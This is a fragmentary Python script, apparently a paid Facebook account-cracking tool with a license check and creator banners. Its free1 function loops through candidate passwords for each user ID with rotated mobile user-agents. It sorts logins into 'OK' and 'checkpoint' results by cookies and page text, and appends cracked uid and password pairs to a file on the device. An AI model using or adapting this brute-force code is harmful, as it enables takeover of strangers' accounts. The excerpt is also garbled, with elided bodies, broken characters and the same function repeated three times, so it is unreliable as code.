...
â•‘ Creator  : JAHID  KHAN                       â•‘
â•‘ Github   : https://github.com/F3ogbaba03  â•‘
â•‘ Facebook : JAHID  KHAN                            â•‘
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : JAHID  KHAN ")
    print("\t  Fb page  : JAHID S COMMUNITY ")
    print("\t  Github   : JAHID 48")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=JAHID "
        print("\n\t     [ Hello User ]\n")
...
â•‘ Creator  : JAHID  KHAN                                 â•‘
â•‘ Github   : https://github.com/F3ogbaba03  â•‘
â•‘ Facebook : JAHID  KHAN  ðŸ™‚â¤ï¸                â•‘
â•‘ Brothers :            JAHID  YT                              â•‘
â•‘ NOTE     :   Paid ToolðŸ˜“                                    â•‘
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[JAHID -OK] '+uid+' [âˆš] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[JAHID ] '+uid+' [~] '+ps+' ')
                    open('/sdcard/JAHID .txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[JAHID -CP] '+uid+' [Ã—] '+ps+ ' ')
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[JAHID  ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[JAHID  ðŸ”¥] [%s] \33[1;97m[OK:%s{JAHID 2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
